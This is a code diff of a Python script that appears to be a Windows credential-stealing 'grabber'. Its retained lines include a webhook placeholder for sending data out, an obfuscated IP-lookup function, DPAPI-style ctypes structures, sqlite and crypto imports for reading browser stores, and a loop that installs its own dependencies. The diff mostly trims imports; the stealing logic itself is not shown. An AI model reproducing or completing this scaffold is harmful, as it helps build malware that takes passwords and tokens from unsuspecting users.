@@ -1,42 +1,19 @@
 import os
 import threading
-import re
-import random
-import re
-import subprocess
-import time
-import ntpath
-import json
-import shutil
-import webbrowser
-import tkinter
-import wmi
-import winreg
-
-import platform
-import httpx
-import sys
-
-from os import getenv, system, name, listdir
-from tempfile import gettempdir, mkdtemp
-from fileinput import filename
-from discord import Embed, File, SyncWebhook
-from os.path import isfile
-from random import choice
-from urllib import request
-from sys import argv
 from sys import executable
-from tkinter import messagebox
-from shutil import copy
-from os.path import isdir, isfile
 from sqlite3 import connect as sql_connect
-from os import getenv, listdir, startfile
+import re
 from base64 import b64decode
 from json import loads as json_loads, load
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from urllib.request import Request, urlopen
 from json import loads, dumps
+import time
+import shutil
 from zipfile import ZipFile
+import random
+import re
+import subprocess
 
 
 hook = "WEBHOOK HERE"
@@ -55,17 +32,7 @@ def g3t1p():
 requirements = [
     ["requests", "requests"],
     ["Crypto.Cipher", "pycryptodome"],
-    ["uplink", "uplink"],
-    ["wmi", "wmi"],
-    ["httpx", "httpx"],
-    ["alive-progress", "alive-progress"],
-    ["psutil", "psutil"],
-    ["cryptography", "cryptography"],
-    ["pypiwin32", "pypiwin32"],
-    ["Pillow", "Pillow"],
-    ["copy", "copy"],
-    ["webbrowser", "webbrowser"],
-    ["", ""],
+    
 ]
 for modl in requirements:
     try: __import__(modl[0])
